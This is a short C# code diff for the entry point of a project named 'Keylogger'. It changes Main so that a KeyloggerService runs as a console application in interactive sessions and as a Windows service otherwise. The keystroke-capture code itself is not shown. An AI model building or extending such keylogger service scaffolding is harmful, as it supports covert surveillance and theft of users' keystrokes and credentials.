@@ -1,19 +1,29 @@
-﻿using System.ServiceProcess;
+﻿using System;
+using System.ServiceProcess;
 
 namespace Keylogger
 {
     public static class Program
     {
-        public static void Main()
+        public static void Main(string[] args)
         {
-            ServiceBase[] ServicesToRun;
-
-            ServicesToRun = new ServiceBase[]
+            if (Environment.UserInteractive)
             {
-                new KeyLoggerService()
-            };
+                KeyloggerService keyloggerService = new KeyloggerService();
 
-            ServiceBase.Run(ServicesToRun);
+                keyloggerService.ExecuteAsConsoleApplication(args);
+            }
+            else
+            {
+                ServiceBase[] ServicesToRun;
+
+                ServicesToRun = new ServiceBase[]
+                {
+                    new KeyloggerService()
+                };
+
+                ServiceBase.Run(ServicesToRun);
+            }
         }
     }
 }
